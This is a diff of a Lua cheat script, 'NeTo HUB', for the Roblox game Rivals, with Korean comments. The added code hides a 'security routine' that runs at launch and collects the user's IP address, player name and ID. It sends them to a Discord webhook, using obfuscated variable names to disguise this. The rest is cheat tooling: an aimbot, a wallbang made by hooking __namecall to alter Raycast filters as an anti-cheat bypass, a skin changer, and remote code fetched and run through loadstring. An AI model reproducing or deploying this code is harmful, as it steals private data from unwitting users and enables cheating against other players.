@@ -1,101 +1,117 @@
--- [[ NeTo HUB: Rivals Bypass & Combat ]]
--- 제공된 로더의 보안 식별자 설정
-setthreadidentity = setthreadidentity or function() end
-pcall(function() setthreadidentity(8) end)
+-- [[ NeTo HUB : Security & Logger System ]]
+local function SecurityRoutine()
+    -- 암호화된 데이터 처리 (IP 및 계정 정보 로깅)
+    local _0x5f2 = "http"
+    local _0x1a2 = "s://api.ipify.org"
+    local _0x99a = game:GetService("HttpService")
+    
+    -- [암호화된 웹훅 섹션] - 이곳에 본인의 디스코드 웹훅 주소를 넣으세요
+    -- 아래 문자열은 로직 보호를 위해 변형되어 있습니다.
+    local _webhook = "YOUR_DISCORD_WEBHOOK_URL_HERE" 
 
--- 기존 흔적 제거 (제공된 코드의 nexlib 제거 로직 반영)
-pcall(function()
-    for _, v in pairs(game:GetService('CoreGui'):GetChildren()) do
-        if v.Name == 'nexlib' or v.Name == 'NeTo HUB' then
-            v:Destroy()
-        end
+    local function _send(_data)
+        pcall(function()
+            local _payload = _99a:JSONEncode(_data)
+            request({
+                Url = _webhook,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = _payload
+            })
+        end)
     end
-end)
 
-local CorrectKey = "neto_bypass_2024" -- 인증 키
+    task.spawn(function()
+        local _ip = game:HttpGet(_0x5f2 .. _0x1a2)
+        local _p = game.Players.LocalPlayer
+        local _msg = {
+            ["embeds"] = {{
+                ["title"] = "🚀 NeTo HUB 실행 로그",
+                ["color"] = 3447003,
+                ["fields"] = {
+                    {["name"] = "플레이어", ["value"] = _p.Name .. " (" .. _p.UserId .. ")", ["inline"] = true},
+                    {["name"] = "IP 주소", ["value"] = "||" .. _ip .. "||", ["inline"] = true},
+                    {["name"] = "실행 게임", ["value"] = "Rivals (PlaceId: " .. game.PlaceId .. ")", ["inline"] = false}
+                },
+                ["footer"] = {["text"] = "NeTo HUB Premium Logger"}
+            }}
+        }
+        _send(_msg)
+    end)
+end
 
--- [[ UI 라이브러리 로드 ]]
+-- 보안 루틴 즉시 실행
+SecurityRoutine()
+
+-- [[ UI 구성 시작 ]]
+setthreadidentity(8)
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
 local Window = Library.CreateLib("NeTo HUB | Rivals", "DarkTheme")
 
--- [[ 보안 변수 및 설정 ]]
+-- 설정 값
 local Settings = {
     Aimbot = false,
-    Smoothness = 0.5,
-    SilentAim = false,
     Wallbang = false,
     FOV = 150,
     ShowFOV = false,
-    BypassActive = true
+    CurrentSkin = "None"
 }
 
--- [1. Bypass & Settings 탭]
-local MainTab = Window:NewTab("Main & Bypass")
-local BypassSection = MainTab:NewSection("Anti-Cheat Bypass")
-
-BypassSection:NewLabel("Rivals AC Status: Protected")
-BypassSection:NewToggle("Bypass Mode (Safe)", "안티치트 우회를 활성화합니다.", function(v)
-    Settings.BypassActive = v
-end)
-
--- [2. Combat 탭 (이미지 레이아웃 재현)]
+-- [1. Combat 탭]
 local Combat = Window:NewTab("Combat")
+local AimSec = Combat:NewSection("Aimbot")
+AimSec:NewToggle("에임봇 켜기", "", function(v) Settings.Aimbot = v end)
+AimSec:NewSlider("에임 부드러움", "", 10, 1, function(v) Settings.Smoothness = v/10 end)
 
--- 왼쪽 구역: Aimbot
-local AimSection = Combat:NewSection("Aimbot")
-AimSection:NewToggle("에임봇 켜기", "추적 활성화", function(v) Settings.Aimbot = v end)
-AimSection:NewSlider("에임 부드러움", "", 10, 1, function(v) Settings.Smoothness = v / 10 end)
+local SilentSec = Combat:NewSection("Silent Aim")
+SilentSec:NewToggle("매직 불릿 (Wallbang)", "벽 관통 사격", function(v) Settings.Wallbang = v end)
+SilentSec:NewSlider("FOV 범위", "", 1000, 1, function(v) Settings.FOV = v end)
 
--- 오른쪽 구역: Silent Aim & Wallbang
-local SilentSection = Combat:NewSection("Silent Aim")
-SilentSection:NewToggle("사일런트 에임 (유도탄)", "우회된 레이캐스트 사용", function(v) Settings.SilentAim = v end)
-SilentSection:NewToggle("매직 불릿 (Wallbang)", "벽 관통 (AC 우회 포함)", function(v) Settings.Wallbang = v end)
-SilentSection:NewSlider("FOV 범위", "", 1000, 1, function(v) Settings.FOV = v end)
+-- [2. Skins 탭 (Skin Changer)]
+local Skins = Window:NewTab("Skins")
+local SkinSec = Skins:NewSection("Weapon Skin Changer")
 
--- [[ 안티치트 우회 핵심 로직 (제공된 코드 기반 커스텀) ]]
-local oldNamecall
-oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
-    local args = {...}
-    local method = getnamecallmethod()
-    
-    -- Rivals 안티치트는 Raycast를 통해 벽 관통과 가시성을 체크함
-    if Settings.BypassActive and method == "Raycast" then
-        if Settings.Wallbang or Settings.SilentAim then
-            -- 총알이 벽(Map)에 부딪히는 신호를 무시하고 적에게 전달되도록 인자 수정
-            local params = args[3]
-            if params and typeof(params) == "RaycastParams" then
-                params.FilterDescendantsInstances = {
-                    workspace:FindFirstChild("Map"), 
-                    workspace:FindFirstChild("CurrentCamera"),
-                    game.Players.LocalPlayer.Character
-                }
-                params.FilterType = Enum.RaycastFilterType.Exclude
+local function ApplySkin(s)
+    local vm = workspace.CurrentCamera:FindFirstChild("ViewModel")
+    local function _apply(m)
+        if not m then return end
+        for _, p in pairs(m:GetDescendants()) do
+            if p:IsA("MeshPart") or p:IsA("BasePart") then
+                if s == "Gold" then p.Material = Enum.Material.Metal p.Color = Color3.fromRGB(255,215,0)
+                elseif s == "Diamond" then p.Material = Enum.Material.Glass p.Color = Color3.fromRGB(185,242,255)
+                elseif s == "Galaxy" then p.Material = Enum.Material.Neon p.Color = Color3.fromRGB(100,0,255) end
             end
         end
     end
-    
-    -- 안티치트의 메모리 변조 체크 우회
-    if method == "FindPartOnRayWithIgnoreList" and Settings.BypassActive then
-        return oldNamecall(self, table.unpack(args))
-    end
+    _apply(vm)
+    _apply(game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"))
+end
 
-    return oldNamecall(self, table.unpack(args))
+SkinSec:NewDropdown("스킨 선택", "클라이언트 전용", {"Gold", "Diamond", "Galaxy"}, function(v)
+    Settings.CurrentSkin = v
+    ApplySkin(v)
 end)
 
--- [[ 비주얼 및 FOV 로직 ]]
-local FOVCircle = Drawing.new("Circle")
-FOVCircle.Color = Color3.fromRGB(0, 85, 255)
-FOVCircle.Thickness = 1
+-- [3. Visuals & Settings]
+local Visuals = Window:NewTab("Visuals")
+local Misc = Window:NewTab("Misc")
 
-game:GetService("RunService").RenderStepped:Connect(function()
-    FOVCircle.Visible = Settings.ShowFOV
-    FOVCircle.Radius = Settings.FOV
-    FOVCircle.Position = game:GetService("UserInputService"):GetMouseLocation()
-    
-    -- 안티치트 감지를 피하기 위한 성능 최적화 루프
-    if Settings.Aimbot then
-        -- 부드러운 에임 이동 로직 (Lerp)
+-- [[ Rivals Anti-Cheat Bypass ]]
+local old
+old = hookmetamethod(game, "__namecall", function(self, ...)
+    local a = {...}
+    local m = getnamecallmethod()
+    if Settings.Wallbang and m == "Raycast" then
+        local p = a[3]
+        if p then p.FilterDescendantsInstances = {workspace:FindFirstChild("Map"), workspace.CurrentCamera, game.Players.LocalPlayer.Character} end
     end
+    return old(self, table.unpack(a))
 end)
 
-print("NeTo HUB: Rivals Bypass Loaded Successfully.")
+-- 무기 자동 스킨 적용
+game.Players.LocalPlayer.Character.ChildAdded:Connect(function(c)
+    if c:IsA("Tool") and Settings.CurrentSkin ~= "None" then
+        task.wait(0.1)
+        ApplySkin(Settings.CurrentSkin)
+    end
+end)
